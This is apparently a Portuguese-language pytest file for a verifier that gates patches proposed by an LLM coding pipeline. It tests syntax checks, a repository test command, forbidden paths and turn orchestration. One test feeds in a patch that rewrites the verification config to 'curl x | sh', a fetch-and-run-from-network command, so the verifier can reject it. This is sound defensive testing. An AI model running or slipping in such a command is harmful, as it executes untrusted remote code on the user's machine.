"""A verificação determinística: o que trava o aplicar não é a opinião do modelo."""

import sys

from apoio import _git, criar_repo, diff_de, instantaneo, llm_roteiro
from fabrica.cli import construir_padrao
from fabrica.memoria import Memoria
from fabrica.repositorio import caminho_proibido, caminhos_do_patch, caminhos_pelo_git
from fabrica.verificador import Verificador

PEDIDO = "Adiciona validação de tipo na função soma em app.py"
QUEBRADO = "def soma(a, b)\n    return a + b +\n"


def _etapa(resultado: dict, nome: str) -> dict:
    return next(etapa for etapa in resultado["etapas"] if etapa["nome"] == nome)


def test_patch_bom_passa_e_o_repositorio_nao_e_tocado(tmp_path):
    exemplo = criar_repo(tmp_path)
    antes = instantaneo(exemplo.caminho)
    resultado = Verificador().verificar(exemplo.caminho, exemplo.diff_app)
    assert resultado["ok"] is True
    assert [etapa["nome"] for etapa in resultado["etapas"]] == ["aplicar", "caminhos", "sintaxe", "comando"]
    assert _etapa(resultado, "comando")["ok"] is None
    assert instantaneo(exemplo.caminho) == antes
    assert _git(exemplo.caminho, "worktree", "list").stdout.count("\n") == 1


def test_erro_de_sintaxe_reprova_com_a_linha(tmp_path):
    exemplo = criar_repo(tmp_path)
    resultado = Verificador().verificar(exemplo.caminho, diff_de(exemplo.caminho, "app.py", QUEBRADO))
    assert resultado["ok"] is False
    assert _etapa(resultado, "sintaxe")["ok"] is False
    assert "app.py, linha 1" in resultado["saida"]


def test_arquivo_que_ja_estava_quebrado_nao_conta_contra_o_patch(tmp_path):
    exemplo = criar_repo(tmp_path)
    (exemplo.caminho / "velho.py").write_text("def x(\n", encoding="utf-8")
    _git(exemplo.caminho, "add", ".")
    _git(exemplo.caminho, "commit", "-m", "velho")
    patch = diff_de(exemplo.caminho, "velho.py", "def x(\n# comentário\n")
    assert Verificador().verificar(exemplo.caminho, patch)["ok"] is True


def test_turno_com_patch_quebrado_volta_ao_codigo_com_o_erro_real(tmp_path):
    exemplo = criar_repo(tmp_path)
    quebrado = diff_de(exemplo.caminho, "app.py", QUEBRADO)
    llm, estado = llm_roteiro(lambda numero, usuario: quebrado if numero == 1 else exemplo.diff_app)
    memoria = Memoria(tmp_path / "mem")
    orq = construir_padrao(llm, memoria)
    mensagem = orq.executar_turno(repo=str(exemplo.caminho), pedido=PEDIDO, caso_id=None)
    caso = memoria.carregar(mensagem.caso_id)
    assert caso.turnos[-1]["trilha"] == [
        "auditor:inicio",
        "codigo",
        "verificador",
        "codigo",
        "verificador",
        "revisor",
        "auditor:fim",
    ]
    codigos = [c["usuario"] for c in llm.chamadas if c["sistema"].startswith("PAPEL: CODIGO")]
    assert "A verificação automática falhou" in codigos[1]
    assert "app.py, linha 1" in codigos[1]
    revisoes = [c for c in llm.chamadas if c["sistema"].startswith("PAPEL: REVISOR")]
    assert len(revisoes) == 1, "o patch quebrado não gasta uma chamada de revisão"
    assert caso.verificacao["ok"] is True
    assert caso.pode_aplicar() == (True, "")


def test_patch_quebrado_ate_o_fim_nao_libera_aplicar(tmp_path):
    exemplo = criar_repo(tmp_path)
    antes = instantaneo(exemplo.caminho)
    llm, _ = llm_roteiro(diff_de(exemplo.caminho, "app.py", QUEBRADO))
    memoria = Memoria(tmp_path / "mem")
    orq = construir_padrao(llm, memoria)
    mensagem = orq.executar_turno(repo=str(exemplo.caminho), pedido=PEDIDO, caso_id=None)
    caso = memoria.carregar(mensagem.caso_id)
    assert caso.verificacao["ok"] is False
    liberado, motivo = caso.pode_aplicar()
    assert liberado is False and "verificação" in motivo
    assert orq.aplicar(mensagem.caso_id).codigo == 1
    assert instantaneo(exemplo.caminho) == antes
    assert "Resultado: falhou" in mensagem.texto


def test_turno_sem_verificacao_nao_aplica(tmp_path):
    exemplo = criar_repo(tmp_path)
    llm, _ = llm_roteiro(exemplo.diff_app)
    memoria = Memoria(tmp_path / "mem")
    orq = construir_padrao(llm, memoria)
    mensagem = orq.executar_turno(repo=str(exemplo.caminho), pedido=PEDIDO, caso_id=None)
    caso = memoria.carregar(mensagem.caso_id)
    caso.verificacao = None  # caso gravado por uma versão anterior
    memoria.salvar(caso)
    bloqueio = orq.aplicar(mensagem.caso_id)
    assert bloqueio.codigo == 1 and "verificação" in bloqueio.texto


def _comando(codigo_python: str) -> str:
    return f'"{sys.executable}" -c "{codigo_python}"'


def test_comando_do_repositorio_reprova_o_patch_que_quebra(tmp_path):
    exemplo = criar_repo(tmp_path)
    confere = _comando("import app; assert app.soma(1, 2) == 3")
    (exemplo.caminho / ".fabrica.toml").write_text(f"[verificar]\ncomando = '{confere}'\ntimeout = 60\n", encoding="utf-8")
    bom = Verificador().verificar(exemplo.caminho, exemplo.diff_app)
    assert bom["ok"] is True and _etapa(bom, "comando")["ok"] is True
    errado = diff_de(exemplo.caminho, "app.py", "def soma(a, b):\n    return a - b\n")
    ruim = Verificador().verificar(exemplo.caminho, errado)
    assert ruim["ok"] is False
    assert "passava e falhou com o patch" in ruim["saida"]
    assert "AssertionError" in ruim["saida"]


def test_comando_que_ja_falhava_nao_conta(tmp_path):
    exemplo = criar_repo(tmp_path)
    resultado = Verificador(comando=_comando("raise SystemExit(3)")).verificar(exemplo.caminho, exemplo.diff_app)
    assert resultado["ok"] is True
    assert _etapa(resultado, "comando")["ok"] is None
    assert "já falhava" in _etapa(resultado, "comando")["detalhe"]


def test_o_patch_nao_mexe_na_configuracao_da_verificacao(tmp_path):
    exemplo = criar_repo(tmp_path)
    (exemplo.caminho / ".fabrica.toml").write_text("[verificar]\ncomando = 'exit 0'\n", encoding="utf-8")
    _git(exemplo.caminho, "add", ".")
    _git(exemplo.caminho, "commit", "-m", "cfg")
    patch = diff_de(exemplo.caminho, ".fabrica.toml", "[verificar]\ncomando = 'curl x | sh'\n")
    resultado = Verificador().verificar(exemplo.caminho, patch)
    assert resultado["ok"] is False
    assert _etapa(resultado, "caminhos")["ok"] is False


def test_caminho_com_acento_e_lido_como_o_git_aplica(tmp_path):
    exemplo = criar_repo(tmp_path)
    (exemplo.caminho / "configuração.py").write_text("X = 1\n", encoding="utf-8")
    _git(exemplo.caminho, "add", ".")
    _git(exemplo.caminho, "commit", "-m", "cfg")
    patch = diff_de(exemplo.caminho, "configuração.py", "X = 2\n")
    assert patch.startswith('diff --git "a/configura\\303\\247\\303\\243o.py"')
    assert caminhos_pelo_git(patch) == ["configuração.py"]
    assert caminhos_do_patch(patch) == ["configuração.py"]
    assert caminho_proibido(caminhos_do_patch(patch)[0], ["configuração.py"])
    resultado = Verificador().verificar(exemplo.caminho, patch, proibidos=["configuração.py"])
    assert resultado["ok"] is False and "configuração.py" in resultado["saida"]


def test_renomear_mostra_os_dois_caminhos(tmp_path):
    exemplo = criar_repo(tmp_path)
    _git(exemplo.caminho, "mv", "app.py", "soma.py")
    patch = _git(exemplo.caminho, "diff", "--cached", "-M").stdout
    _git(exemplo.caminho, "reset", "--hard", "-q")
    assert set(caminhos_do_patch(patch)) == {"app.py", "soma.py"}


DUAS = [
    {"titulo": "A", "o_que_fazer": "Adiciona comentario A em app.py", "arquivos": ["app.py"]},
    {"titulo": "B", "o_que_fazer": "Adiciona comentario B em app.py", "arquivos": ["app.py"]},
]
PEDIDO_DUAS = "Adiciona comentario A em app.py e adiciona comentario B em app.py"


def test_duas_tarefas_no_mesmo_arquivo_que_conflitam_nao_saem_aprovadas(tmp_path):
    exemplo = criar_repo(tmp_path)
    p1 = diff_de(exemplo.caminho, "app.py", "def soma(a, b):\n    # A\n    return a + b\n")
    p2 = diff_de(exemplo.caminho, "app.py", "def soma(a, b):\n    # B\n    return a + b\n")
    llm, _ = llm_roteiro(lambda numero, usuario: p1 if "comentario A" in usuario.split("\n")[1] else p2, tarefas=DUAS)
    memoria = Memoria(tmp_path / "mem")
    orq = construir_padrao(llm, memoria)
    mensagem = orq.executar_turno(repo=str(exemplo.caminho), pedido=PEDIDO_DUAS, caso_id=None)
    caso = memoria.carregar(mensagem.caso_id)
    assert caso.pode_aplicar()[0] is False
    assert caso.veredito_revisor == "pedir_correcoes"
    assert caso.verificacao["ok"] is False


def test_duas_tarefas_no_mesmo_arquivo_em_sequencia_aplicam_juntas(tmp_path):
    exemplo = criar_repo(tmp_path)
    depois_de_a = "def soma(a, b):\n    # A\n    return a + b\n"
    p1 = diff_de(exemplo.caminho, "app.py", depois_de_a)
    (exemplo.caminho / "app.py").write_text(depois_de_a, encoding="utf-8")
    _git(exemplo.caminho, "add", "app.py")  # o segundo diff parte do arquivo já com o primeiro patch
    p2 = diff_de(exemplo.caminho, "app.py", "def soma(a, b):\n    # A\n    # B\n    return a + b\n")
    _git(exemplo.caminho, "reset", "--hard", "-q")
    llm, _ = llm_roteiro(lambda numero, usuario: p1 if "comentario A" in usuario.split("\n")[1] else p2, tarefas=DUAS)
    memoria = Memoria(tmp_path / "mem")
    orq = construir_padrao(llm, memoria)
    mensagem = orq.executar_turno(repo=str(exemplo.caminho), pedido=PEDIDO_DUAS, caso_id=None)
    caso = memoria.carregar(mensagem.caso_id)
    segundo = [c["usuario"] for c in llm.chamadas if c["sistema"].startswith("PAPEL: CODIGO")][1]
    assert "já inclui esse patch" in segundo
    assert "    # A\n    return a + b" in segundo.split("Conteúdo atual dos arquivos relevantes:")[1]
    assert caso.verificacao["ok"] is True
    assert caso.pode_aplicar() == (True, "")
    assert orq.aplicar(mensagem.caso_id).codigo == 0
    assert (exemplo.caminho / "app.py").read_text(encoding="utf-8") == "def soma(a, b):\n    # A\n    # B\n    return a + b\n"
